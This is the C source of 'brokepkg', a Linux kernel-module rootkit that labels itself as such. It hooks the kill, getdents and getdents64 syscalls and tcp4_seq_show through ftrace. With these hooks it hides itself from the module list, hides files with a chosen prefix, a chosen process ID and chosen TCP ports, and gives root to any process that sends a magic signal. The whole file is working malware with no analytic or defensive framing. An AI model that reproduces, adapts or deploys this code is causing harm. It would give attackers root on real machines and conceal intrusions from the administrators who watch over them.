#include "hooks.h"

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;
static t_syscall orig_kill;
#else
typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *,
                                           unsigned int);
typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
                                             struct linux_dirent64 *,
                                             unsigned int);
typedef asmlinkage long (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;
#endif
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static inline void tidy(void) {
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *prev_module;
static short isHidden = 0;
char hide_pid[NAME_MAX];
unsigned short hide_port[MAX_TCP_PORTS] = {0};

void module_show(void) {
  list_add(&THIS_MODULE->list, prev_module);
  isHidden = 0;
#ifdef DEBUG
  printk(KERN_INFO "brokepkg: module revealed");
#endif
}

void module_hide(void) {
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  isHidden = 1;
#ifdef DEBUG
  printk(KERN_INFO "brokepkg: hidden module");
#endif
}

void pid_hide(pid_t pid) {
  sprintf(hide_pid, "%d", pid);
#ifdef DEBUG
  printk(KERN_INFO "brokepkg: hiding process with pid %d\n", pid);
#endif
}

void port_hide(unsigned short port) {
  size_t i;
  for (i = 0; i < MAX_TCP_PORTS; i++) {
    if (hide_port[i] == 0) {
      hide_port[i] = port;
#ifdef DEBUG
      printk(KERN_INFO "Port %d hidden\n", port);
#endif
      return;
    }
  }
}

void port_show(unsigned short port) {
  size_t i;
  for (i = 0; i < MAX_TCP_PORTS; i++) {
    if (hide_port[i] == port) {
      hide_port[i] = 0;
#ifdef DEBUG
      printk(KERN_INFO "Port %d unhidden\n", port);
#endif
      return;
    }
  }
}

int port_is_hidden(unsigned short port) {
  size_t i;
  for (i = 0; i < MAX_TCP_PORTS; i++) {
    if (hide_port[i] == port) {
      return 1;  // true
    }
  }
  return 0;  // false
}

void give_root(void) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
  current->uid = current->gid = 0;
  current->euid = current->egid = 0;
  current->suid = current->sgid = 0;
  current->fsuid = current->fsgid = 0;
#else
  struct cred *newcreds;
  newcreds = prepare_creds();
  if (newcreds == NULL) return;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && \
        defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || \
    LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
  newcreds->uid.val = newcreds->gid.val = 0;
  newcreds->euid.val = newcreds->egid.val = 0;
  newcreds->suid.val = newcreds->sgid.val = 0;
  newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
  newcreds->uid = newcreds->gid = 0;
  newcreds->euid = newcreds->egid = 0;
  newcreds->suid = newcreds->sgid = 0;
  newcreds->fsuid = newcreds->fsgid = 0;
#endif
  commit_creds(newcreds);
#endif
#ifdef DEBUG
  printk(KERN_INFO "brokepkg: given away root");
#endif
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hook_kill(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  pid_t pid = (pid_t)pt_regs->di;
  int sig = (int)pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  pid_t pid = (pid_t)pt_regs->regs[0];
  int sig = (int)pt_regs->regs[1];
#endif
#else
asmlinkage int hook_kill(pid_t pid, int sig) {
#endif
  switch (sig) {
    case SIGHIDE:
      if (isHidden)
        module_show();
      else
        module_hide();
      break;
    case SIGMODINVIS:
      pid_hide(pid);
      break;
    case SIGROOT:
      give_root();
      break;
    case SIGPORT:
      if (port_is_hidden((unsigned short)pid))
        port_show((unsigned short)pid);
      else
        port_hide((unsigned short)pid);
      break;

    default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
      return orig_kill(pt_regs);
#else
      return orig_kill(pid, sig);
#endif
      break;
  }
  return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hook_getdents64(const struct pt_regs *regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  // int fd = (int)regs->di;
  struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  // int fd = (int)regs->regs[0];
  struct linux_dirent *dirent = (struct linux_dirent *)regs->regs[1];
#endif
  int ret = orig_getdents64(regs);
#else
static asmlinkage int hook_getdents64(unsigned int fd,
                                      struct linux_dirent64 *dirent,
                                      unsigned int count) {
  int ret = orig_getdents64(fd, dirent, count);
#endif
  long error;
  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
  unsigned long offset = 0;

  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL)) return ret;

  error = copy_from_user(dirent_ker, dirent, ret);
  if (error) goto done;

  while (offset < ret) {
    current_dir = (void *)dirent_ker + offset;

    if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 ||
        ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) &&
         (strncmp(hide_pid, "", NAME_MAX) != 0))) {
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
        continue;
      }

      previous_dir->d_reclen += current_dir->d_reclen;
    } else {
      previous_dir = current_dir;
    }

    offset += current_dir->d_reclen;
  }

  error = copy_to_user(dirent, dirent_ker, ret);
  if (error) goto done;

done:

  kfree(dirent_ker);
  return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hook_getdents(const struct pt_regs *regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  // int fd = (int)regs->di;
  struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  // int fd = (int)regs->regs[0];
  struct linux_dirent *dirent = (struct linux_dirent *)regs->regs[1];
#endif
  int ret = orig_getdents(regs);
#else
static asmlinkage int hook_getdents(unsigned int fd,
                                    struct linux_dirent *dirent,
                                    unsigned int count) {
  int ret = orig_getdents(fd, dirent, count);
#endif
  struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
  };
  long error;
  unsigned long offset = 0;

  struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;

  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL)) return ret;

  error = copy_from_user(dirent_ker, dirent, ret);
  if (error) goto done;

  while (offset < ret) {
    current_dir = (void *)dirent_ker + offset;

    if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 ||
        ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) &&
         (strncmp(hide_pid, "", NAME_MAX) != 0))) {
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
        continue;
      }
      previous_dir->d_reclen += current_dir->d_reclen;
    } else {
      previous_dir = current_dir;
    }

    offset += current_dir->d_reclen;
  }

  error = copy_to_user(dirent, dirent_ker, ret);
  if (error) goto done;

done:
  kfree(dirent_ker);
  return ret;
}

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {
  long ret;
  struct sock *sk = v;

  if (sk != (struct sock *)0x1) {
    size_t i;
    for (i = 0; i < MAX_TCP_PORTS; i++) {
      if (hide_port[i] == sk->sk_num) return 0;
    }
  }

  ret = orig_tcp4_seq_show(seq, v);
  return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init rootkit_init(void) {
  int err;
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err) return err;

#ifdef DEBUG
  printk(KERN_INFO "brokepkg now is runing\n");
#endif
  tidy();

  return 0;
}

static void __exit rootkit_exit(void) {
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
#ifdef DEBUG
  printk(KERN_INFO "brokepkg unloaded, my work has completed\n");
#endif
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("R3tr074");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.8");
